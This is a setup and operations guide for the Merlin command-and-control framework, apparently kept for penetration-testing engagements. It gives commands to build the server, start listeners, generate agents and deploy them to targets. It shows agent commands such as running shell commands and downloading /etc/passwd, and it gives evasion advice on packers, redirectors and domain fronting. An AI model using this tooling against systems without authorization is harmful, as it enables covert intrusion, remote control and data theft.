# Merlin C2 Setup Guide

**Status**: Installed on host (manual management)  
**Version**: v2.1.4  
**Location**: `~/c2/merlin/`  

## Overview

Merlin C2 is installed **on the host system** and managed manually. It is NOT containerized because:
- C2 servers need persistent infrastructure across engagements
- Agents callback to host IP, not container IPs
- Systemd service enables auto-start on boot
- Maintains state across multiple simultaneous engagements

## Installation

### Automated Installation

```bash
# Download and run installer
curl -O https://raw.githubusercontent.com/<your-repo>/offsec-workstation/main/scripts/c2/install-merlin.sh
chmod +x install-merlin.sh
./install-merlin.sh v2.1.4
```

### Manual Installation

```bash
# 1. Clone and build Merlin server
cd /tmp
git clone --depth 1 --branch v2.1.4 https://github.com/Ne0nd0g/merlin.git
cd merlin
make linux  # or: go build -o merlinServer main.go

# 2. Install to ~/c2/merlin
mkdir -p ~/c2/merlin/bin
cp merlinServer ~/c2/merlin/bin/

# 3. Clone and build CLI
cd /tmp
git clone https://github.com/Ne0nd0g/merlin-cli.git
cd merlin-cli
go build -o merlinCLI main.go

# 4. Install CLI
mkdir -p ~/c2/merlin/data/bin
cp merlinCLI ~/c2/merlin/data/bin/
chmod +x ~/c2/merlin/data/bin/merlinCLI

# 5. Generate TLS certificates
cd ~/c2/merlin/data
mkdir -p x509
cd x509
openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes -subj "/CN=merlin"
chmod 600 server.key server.crt
```

## Directory Structure

```
~/c2/merlin/
├── bin/
│   └── merlinServer          # C2 server binary
├── data/
│   ├── bin/
│   │   └── merlinCLI         # CLI client
│   ├── x509/                 # TLS certificates
│   └── modules/              # Post-exploitation modules
├── logs/                     # Server logs
└── MERLIN-QUICKSTART.md      # Quick reference
```

## Usage

### Starting the Server

**Terminal 1: Start Server**
```bash
cd ~/c2/merlin/bin
./merlinServer -addr 0.0.0.0:50051 -password merlin
```

**Options:**
- `-addr`: gRPC server address (default: 127.0.0.1:50051)
- `-password`: CLI authentication password (default: merlin)
- `-debug`: Enable debug logging
- `-secure`: Require client TLS certificates

### Connecting with CLI

**Terminal 2: Connect CLI**
```bash
cd ~/c2/merlin
./data/bin/merlinCLI
```

**At prompt:**
```
Merlin» connect 127.0.0.1:50051
Password: merlin
```

### Creating a Listener

```bash
Merlin» listeners
Merlin[listeners]» use http
Merlin[listeners][http]» set Port 443
Merlin[listeners][http]» set Interface 0.0.0.0
Merlin[listeners][http]» start
```

**Available listener types:**
- `http` - HTTP/1.1
- `https` - HTTP/1.1 over TLS
- `h2c` - HTTP/2 clear-text
- `http3` - HTTP/3 (QUIC)
- `smb` - SMB named pipes
- `tcp` - TCP bind/reverse
- `udp` - UDP bind/reverse

### Generating Agents

```bash
Merlin» sessions
Merlin[sessions]» generate
# Follow interactive prompts

# Or specify directly:
Merlin[sessions]» generate -Name agent1 -Listener http -OS linux -Arch x64 -Output /home/user/engage/client/c2/agents/
```

### Interacting with Agents

```bash
Merlin» sessions
# Copy agent GUID
Merlin» interact <agent-guid>
Merlin[agent]» help
Merlin[agent]» shell whoami
Merlin[agent]» pwd
Merlin[agent]» download /etc/passwd /tmp/passwd
```

## Systemd Service (Optional)

For auto-start on boot:

```bash
# 1. Create service file
sudo tee /etc/systemd/system/merlin-c2.service << EOF
[Unit]
Description=Merlin C2 Server
After=network.target

[Service]
Type=simple
User=$USER
WorkingDirectory=$HOME/c2/merlin/bin
ExecStart=$HOME/c2/merlin/bin/merlinServer -addr 0.0.0.0:50051 -password merlin
Restart=on-failure
RestartSec=10
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

# 2. Enable and start
sudo systemctl daemon-reload
sudo systemctl enable merlin-c2
sudo systemctl start merlin-c2

# 3. Check status
sudo systemctl status merlin-c2
journalctl -u merlin-c2 -f
```

## Engagement Workflow

### Per-Engagement Setup

```bash
# 1. Start Merlin server (if not already running)
~/c2/scripts/start-merlin.sh

# 2. Connect CLI in another terminal
cd ~/c2/merlin
./data/bin/merlinCLI

# 3. Create engagement-specific listener
Merlin» listeners
Merlin[listeners]» use https
Merlin[listeners][https]» set Port 443
Merlin[listeners][https]» set Name client-engagement
Merlin[listeners][https]» start

# 4. Generate agent for engagement
Merlin» sessions
Merlin[sessions]» generate -Listener client-engagement -Output ~/engage/client/c2/agents/

# 5. Deploy agent to target
# (Copy generated binary to target and execute)

# 6. Interact when agent checks in
Merlin» sessions
Merlin» interact <agent-guid>
```

### Directory Integration

Engagement agents are stored in:
```
~/engage/<engagement-name>/
├── c2/
│   ├── agents/          # Generated agents for this engagement
│   │   ├── agent1.exe
│   │   └── agent2
│   ├── callbacks/       # Agent callback logs (from Merlin logs)
│   └── loot/           # Exfiltrated data
```

## OPSEC Considerations

### Listener Configuration
- Use HTTPS listeners for encrypted traffic
- Configure custom JWTs for authentication
- Set appropriate sleep/jitter (e.g., 30s ±30%)
- Use HTTP/2 or HTTP/3 for modern protocol mimicry

### Agent Generation
- Compile agents with custom build tags
- Strip debug symbols
- Pack/encrypt with custom packers
- Randomize agent metadata

### Network
- Use redirectors (nginx, Apache, CloudFlare)
- Rotate listener ports/domains
- Implement domain fronting where applicable
- Monitor for C2 detection (Shodan, Censys)

## Common Commands

### Server Management
```bash
# Start server
~/c2/scripts/start-merlin.sh

# Stop server
pkill merlinServer

# Check if running
ps aux | grep merlinServer

# View logs
journalctl -u merlin-c2 -f  # If using systemd
```

### CLI Commands
```bash
# List listeners
Merlin» listeners

# List agents
Merlin» sessions

# Show jobs
Merlin» jobs

# View modules
Merlin» modules

# Execute local command
Merlin» ! ls -la

# Disconnect
Merlin» quit
```

## Troubleshooting

### CLI Won't Connect
```bash
# Check server is running
ps aux | grep merlinServer

# Check port is listening
ss -tulpn | grep 50051

# Test connectivity
telnet 127.0.0.1 50051
```

### Agent Won't Callback
- Verify listener is started: `listeners`
- Check firewall rules: `sudo ufw status`
- Review agent configuration
- Check Merlin server logs

### Permission Denied
```bash
# Fix binary permissions
chmod +x ~/c2/merlin/bin/merlinServer
chmod +x ~/c2/merlin/data/bin/merlinCLI
```

## Documentation

- **Official Docs**: https://merlin-c2.readthedocs.io
- **GitHub**: https://github.com/Ne0nd0g/merlin
- **CLI Repo**: https://github.com/Ne0nd0g/merlin-cli
- **Wiki**: https://github.com/Ne0nd0g/merlin-documentation

## Security Notes

⚠️ **Important:**
- Change default password from `merlin`
- Use TLS for production deployments (`-secure` flag)
- Rotate listener credentials per engagement
- Clean up agents post-engagement
- Review logs for detection indicators
- Never expose C2 server directly to internet

## Updates

```bash
# Backup current installation
mv ~/c2/merlin ~/c2/merlin.backup

# Install new version
./install-merlin.sh v2.x.x

# Restore data if needed
cp -r ~/c2/merlin.backup/data ~/c2/merlin/
```

---

**Status**: ✅ Installed and tested  
**Last Updated**: 2026-02-23  
**Installed Version**: v2.1.4
